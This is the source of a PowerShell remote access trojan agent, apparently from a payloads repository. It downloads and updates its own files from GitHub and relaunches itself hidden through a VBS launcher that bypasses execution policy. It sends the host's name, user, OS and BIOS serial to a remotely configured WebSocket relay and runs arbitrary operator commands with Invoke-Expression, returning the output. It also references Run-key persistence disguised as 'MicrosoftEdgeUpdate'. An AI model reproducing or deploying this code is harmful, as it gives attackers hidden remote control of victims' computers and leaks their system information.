$versionUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/refs/heads/main/RAT/version.json"
$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$playerPath = Join-Path $scriptDir "player.py"


$remote = Invoke-RestMethod -Uri $versionUrl

$localPath = Join-Path $scriptDir "version.json"

if (Test-Path $localPath) {
    $local = Get-Content $localPath | ConvertFrom-Json
} else {
    $local = @{ agent_version = "0.0"; files = @() }
}

if ($remote.agent_version -ne $local.agent_version) {
    Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $scriptDir "agent.ps1")

    foreach ($remoteFile in $remote.files) {
        Invoke-WebRequest -Uri ($baseUrl + $remoteFile.name) -OutFile (Join-Path $scriptDir $remoteFile.name)
    }

    $remote | ConvertTo-Json | Set-Content $localPath
    $agentPath = Join-Path $scriptDir "agent.ps1"
    $vbsPath = Join-Path $scriptDir "launcher.vbs"

@"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
"@ | Set-Content $vbsPath

    Start-Process wscript.exe -ArgumentList "`"$vbsPath`""
    exit
}

foreach ($remoteFile in $remote.files) {
    $localFile = $local.files | Where-Object { $_.name -eq $remoteFile.name }
    if (-not $localFile -or $localFile.version -ne $remoteFile.version) {
        Invoke-WebRequest -Uri ($baseUrl + $remoteFile.name) -OutFile (Join-Path $scriptDir $remoteFile.name)
    }
}
$remote | ConvertTo-Json | Set-Content $localPath

$infos = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    serial = (Get-WmiObject Win32_BIOS).SerialNumber
}

$json = $infos | ConvertTo-Json

$ws = New-Object System.Net.WebSockets.ClientWebSocket

$configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
$config = Invoke-RestMethod -Uri $configUrl
$uri = [System.Uri]"$($config.relay_url)/ws"

$token = [System.Threading.CancellationToken]::None

$task = $ws.ConnectAsync($uri, $token)
$task.Wait()

$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
$segment = [System.ArraySegment[byte]]::new($bytes)
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()

$buffer = [byte[]]::new(4096)
$segment = [System.ArraySegment[byte]]::new($buffer)

while ($ws.State -eq "Open") {
    $result = $ws.ReceiveAsync($segment, $token)
    $result.Wait()
    $message = [System.Text.Encoding]::UTF8.GetString($segment.Array, 0, $result.Result.Count)
    
    if ($message.Trim() -ne "") {
        try {
            $cmd = $message | ConvertFrom-Json

            if ($cmd.type -eq "play_video" -or $cmd.type -eq "play_sound") {
                if ($cmd.type -eq "play_video") { $mode = "video" }
                else { $mode = "sound" }
                
                Start-Process python -ArgumentList "$playerPath --file $($cmd.file) --duration $($cmd.duration) --volume $($cmd.volume) --mode $mode" -WindowStyle Hidden
            }

            elseif ($cmd.type -eq "kill") {
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdate"
                Remove-Item -Path $scriptDir -Recurse -Force
                exit
            }

        } catch {
            $output = Invoke-Expression $message
            $outputString = $output | Out-String
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($outputString)
            $segment_out = [System.ArraySegment[byte]]::new($bytes)
            $ws.SendAsync($segment_out, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
        }
    }
}
